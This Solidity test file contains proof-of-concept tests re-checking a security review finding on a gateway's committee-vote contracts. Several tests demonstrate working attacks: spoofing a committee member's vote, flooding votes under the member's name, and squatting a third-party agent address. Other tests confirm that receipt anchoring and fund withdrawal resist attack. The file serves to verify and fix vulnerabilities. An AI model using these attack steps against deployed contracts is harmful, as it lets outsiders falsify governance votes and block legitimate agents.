// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Adversarial re-check of finding 3 of docs/code-review/20261012-security-review.md (committee vote attribution).
// Run: forge test --match-path 'contracts/test/SecurityReviewRecheckCommitteePoc.t.sol' -vv

import {ICGatewayIntegration} from "./ICGatewayIntegration.t.sol";
import {IInvestmentCommitteePolicy} from "../gateway/interfaces/IInvestmentCommitteePolicy.sol";
import {InvestmentCommitteePolicy} from "../gateway/InvestmentCommitteePolicy.sol";
import {ConsensusRecommendationReceipt} from "../gateway/ConsensusRecommendationReceipt.sol";
import {
    IConsensusRecommendationReceipt
} from "../gateway/interfaces/IConsensusRecommendationReceipt.sol";
import {RobotMoneyGateway} from "../gateway/RobotMoneyGateway.sol";
import {IGateway} from "../gateway/interfaces/IGateway.sol";

contract SecurityReviewRecheckCommitteePoc is ICGatewayIntegration {
    address attacker = address(0xB2);

    function _selfPolicy(address self) internal view returns (IGateway.AgentPolicy memory) {
        address[] memory empty = new address[](0);
        return IGateway.AgentPolicy({
            active: true,
            validUntil: uint64(block.timestamp + 30 days),
            maxPerPayment: 1e6,
            maxPerWindow: 10e6,
            shareReceiver: self,
            allowedDestinations: empty,
            assetRecipient: self,
            maxWithdrawPerPayment: 1e6,
            maxWithdrawPerWindow: 10e6,
            allowedSourceVaults: empty
        });
    }

    /// Permissionless commit/reveal: `owner` authorizes `agent` (may be any
    /// address that is not already owned) with a policy naming `owner` as
    /// shareReceiver, as `_validatePolicy` demands of non-admin callers.
    function _selfReveal(address owner, address agent, bytes32 salt) internal {
        bytes32 commitment = keccak256(abi.encode(agent, owner, salt));
        vm.prank(owner);
        gateway.commitAuthorization(commitment);
        vm.roll(block.number + 1);
        vm.prank(owner);
        gateway.revealAuthorization(agent, salt, _selfPolicy(owner));
    }

    // ── Q5: spoof supersedes the real member's latest vote ─────────────────

    function test_spoofedVoteSupersedesMembersLatestVote() public {
        // Real member votes Overweight 6000 bps.
        IInvestmentCommitteePolicy.VoteParams memory real = _defaultVoteParams();
        vm.prank(committeeAgent);
        uint256 realId = gateway.committeeVoteSubmit(real);
        assertEq(ic.latestVoteByAgent(committeeAgent), realId);

        // Attacker self-registers and back-runs with an opposite vote under
        // the member's address.
        _selfReveal(attacker, attacker, keccak256("f3-spoof"));
        IInvestmentCommitteePolicy.VoteParams memory spoof = _defaultVoteParams();
        spoof.stance = IInvestmentCommitteePolicy.Stance.Underweight;
        spoof.targetWeightBps = 0;
        spoof.voteJsonHash = keccak256("attacker-memo");
        spoof.rationaleUri = "https://attacker.example/memo.json";
        vm.prank(attacker);
        uint256 spoofId = gateway.committeeVoteSubmit(spoof);

        // "Latest wins" readers (architecture.md L581, latestVoteByAgent) now
        // see the attacker's vote as the member's live position.
        assertEq(ic.latestVoteByAgent(committeeAgent), spoofId);
        InvestmentCommitteePolicy.Vote memory v = ic.getVote(spoofId);
        assertEq(v.agent, committeeAgent);
        assertEq(uint8(v.stance), uint8(InvestmentCommitteePolicy.Stance.Underweight));
        assertEq(v.targetWeightBps, 0);
        // The real vote is not reverted or deleted: append-only, no DoS.
        assertEq(ic.voteCount(), 2);
    }

    // ── Q4: unbounded flood under a member's name (aggregate dominance) ─────

    function test_spoofedVotesFloodUnderMemberName() public {
        _selfReveal(attacker, attacker, keccak256("f3-flood"));
        IInvestmentCommitteePolicy.VoteParams memory spoof = _defaultVoteParams();
        spoof.targetWeightBps = 0;
        for (uint256 i = 0; i < 25; i++) {
            spoof.voteJsonHash = keccak256(abi.encode("attacker-memo", i));
            vm.prank(attacker);
            gateway.committeeVoteSubmit(spoof);
        }
        // Every row names the member; the indexer AVG/COUNT over
        // committee_votes (db.rs L1979-1983, routes.rs L1720-1727) has no
        // per-agent dedupe, so 25 of 25 verified rows are attacker-authored.
        assertEq(ic.voteCount(), 25);
        for (uint256 i = 0; i < 25; i++) {
            assertEq(ic.getVote(i).agent, committeeAgent);
        }
    }

    // ── Q3: receipt anchoring is NOT spoofable (confirms report) ────────────

    function test_selfRegisteredAgentCannotAnchorReceipt() public {
        ConsensusRecommendationReceipt receipt =
            new ConsensusRecommendationReceipt(admin, address(gateway), address(ic));
        vm.prank(admin);
        gateway.setConsensusReceipt(address(receipt));

        _selfReveal(attacker, attacker, keccak256("f3-receipt"));
        vm.prank(attacker);
        vm.expectRevert(IConsensusRecommendationReceipt.SubmitterNotAllowlisted.selector);
        gateway.consensusRecordReceipt(keccak256("rid"), keccak256("digest"), "https://x/r");

        // The real member can.
        vm.prank(committeeAgent);
        gateway.consensusRecordReceipt(keccak256("rid"), keccak256("digest"), "https://x/r");
        assertEq(receipt.getReceipt(0).submitter, committeeAgent);
    }

    // ── Q2: permissionless reveal squats a THIRD-PARTY agent address ───────

    function test_permissionlessRevealSquatsThirdPartyAgentAddress() public {
        // A future committee member's published EOA, not yet gateway-authorized.
        address victim = address(0xD1);

        // Attacker owns the victim's gateway agent entry; victim now holds
        // AGENT_ROLE with shareReceiver/assetRecipient = attacker.
        _selfReveal(attacker, victim, keccak256("f3-squat"));
        assertEq(gateway.agentOwner(victim), attacker);
        assertTrue(gateway.hasRole(gateway.AGENT_ROLE(), victim));
        (,,,, address sr, address ar,,) = gateway.agents(victim);
        assertEq(sr, attacker);
        assertEq(ar, attacker);

        // Admin cannot onboard the victim: no admin override of agentOwner.
        vm.prank(admin);
        vm.expectRevert(RobotMoneyGateway.AgentAlreadyOwned.selector);
        gateway.authorizeAgent(victim, _selfPolicy(victim));

        // Admin can strip the role, but ownership persists, so onboarding stays blocked.
        bytes32 agentRole = gateway.AGENT_ROLE();
        vm.prank(admin);
        gateway.revokeRole(agentRole, victim);
        assertEq(gateway.agentOwner(victim), attacker);
        vm.prank(admin);
        vm.expectRevert(RobotMoneyGateway.AgentAlreadyOwned.selector);
        gateway.authorizeAgent(victim, _selfPolicy(victim));

        // Only the squatter can release it.
        vm.prank(attacker);
        gateway.revokeAgent(victim);
        assertEq(gateway.agentOwner(victim), address(0));
    }

    // ── Q2: self-registered agent's fund paths pull only from itself ────────

    function test_selfRegisteredAgentCannotPullAnotherHoldersShares() public {
        // A holder owns vault shares and has NOT approved the gateway.
        address holder = address(0xE1);
        usdc.mint(holder, 5e6);
        vm.startPrank(holder);
        usdc.approve(address(vault), 5e6);
        vault.deposit(5e6, holder);
        vm.stopPrank();
        assertEq(vault.balanceOf(holder), 5e6);

        _selfReveal(attacker, attacker, keccak256("f3-funds"));
        // withdraw() pulls shares from msg.sender (L1230); attacker holds none.
        vm.prank(attacker);
        vm.expectRevert();
        gateway.withdraw(
            keccak256("o"), 1e6, address(vault), uint64(block.timestamp + 60), keccak256("k")
        );
        assertEq(vault.balanceOf(holder), 5e6);
    }
}
